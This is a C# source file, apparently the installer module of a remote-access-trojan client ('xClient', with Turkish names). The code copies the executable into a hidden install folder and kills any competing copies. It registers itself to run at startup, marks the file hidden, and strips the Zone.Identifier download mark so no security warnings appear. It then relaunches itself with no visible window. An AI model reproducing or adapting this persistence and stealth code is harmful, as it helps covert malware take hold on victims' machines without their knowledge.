using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient.KuuhakuÇekirdek.Kurulum
{
    public static class ClientYükleyici
    {
        public static void Install(Client client)
        {
            var isKilled = false;

            // klasör oluşturma
            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
            {
                try
                {
                    Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
                }
                catch (Exception)
                {
                    return;
                }
            }

            // silme
            if (File.Exists(ClientVerisi.InstallPath))
            {
                try
                {
                    File.Delete(ClientVerisi.InstallPath);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // eğer mutex değişirse eski işlemi öldürme
                        var foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(ClientVerisi.InstallPath));
                        var myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;
                            prc.Kill();
                            isKilled = true;
                        }
                    }
                }
            }

            if (isKilled) Thread.Sleep(5000);

            try
            {
                File.Copy(ClientVerisi.CurrentPath, ClientVerisi.InstallPath, true);
            }
            catch (Exception)
            {
                return;
            }

            if (Settings.STARTUP)
            {
                if (!Başlangıç.AddToStartup())
                    ClientVerisi.AddToStartupFailed = true;
            }

            if (Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(ClientVerisi.InstallPath, FileAttributes.Hidden);
                }
                catch (Exception)
                {
                }
            }

            DosyaYardımcısı.DeleteZoneIdentifier(ClientVerisi.InstallPath);

            //dosya başlatma
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                FileName = ClientVerisi.InstallPath
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception)
            {
            }
        }
    }
}